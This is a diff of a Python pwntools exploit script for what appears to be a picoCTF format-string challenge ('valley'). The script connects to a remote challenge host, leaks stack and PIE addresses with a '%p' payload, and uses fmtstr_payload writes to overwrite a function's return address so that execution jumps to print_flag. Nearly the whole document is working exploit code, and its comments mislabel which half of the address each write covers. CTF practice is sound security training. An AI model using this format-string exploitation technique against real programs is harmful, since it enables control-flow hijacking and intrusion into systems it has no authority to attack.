@@ -7,26 +7,84 @@ python3 -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,40)]))" 
 
 from pwn import *
 
-context.binary = elf = ELF('./valley')
-p = process('./valley')
+  
 
-# Offsets (example only — adjust yours!)
-offset = 6
+context.update(arch="amd64")
 
-# Get runtime PIE base manually from GDB (e.g., 0x555555554000)
-pie_base = 0x555555554000
-print_flag = pie_base + elf.symbols['print_flag']
+  
 
-# Find return address offset on stack (e.g., position 10)
-target_addr_on_stack = 10
+def leak(p):
 
-# Split the print_flag address into two-byte chunks (little endian)
-writes = {
-    elf.address + offset: (print_flag & 0xffff),
-    elf.address + offset + 2: ((print_flag >> 16) & 0xffff),
-    # Add 4 if needed
-}
+    payload = b"%20$p.%21$p"
 
-payload = fmtstr_payload(offset, writes, write_size='short')
+    p.sendlineafter(b"Try Shouting: \n", payload)
+
+    return p.recv().strip().split(b" ")[-1]
+
+  
+
+#p = process("./valley")
+
+p = remote("shape-facility.picoctf.net", 64728)
+
+  
+
+all_leaks       = leak(p)
+
+pie_leak        = int(all_leaks.split(b".")[1], 16)
+
+stack_leak      = int(all_leaks.split(b".")[0], 16)
+
+pie_base        = pie_leak - 0x1413
+
+print_flag      = pie_base + 0x1269
+
+target_address  = stack_leak - 8
+
+  
+
+print("[+] pie leak: 0x%x" % pie_leak)
+
+print("[+] stack leak: 0x%x" % stack_leak)
+
+print("[+] pie base @ 0x%x" % pie_base)
+
+print("[+] print_flag @ 0x%x" % print_flag)
+
+print("[+] overwrite target @ 0x%x (echo_valley() return address)" % target_address)
+
+  
+
+# write the upper 4 bytes
+
+writes  = {target_address: print_flag & 0xffffffff }
+
+payload = fmtstr_payload(6, writes)
+
+print(payload)
+
 p.sendline(payload)
+
+p.recvuntil(b"You heard in the distance: ")
+
+  
+
+# write lower 4 bytes
+
+writes = {target_address + 4: print_flag >> 32 }
+
+payload = fmtstr_payload(6, writes)
+
+p.sendline(payload)
+
+p.recvuntil(b"You heard in the distance: ")
+
+  
+
+p.sendline(b"exit")
+
+p.recvuntil(b"The Valley Disappears\n")
+
+  
+
 p.interactive()
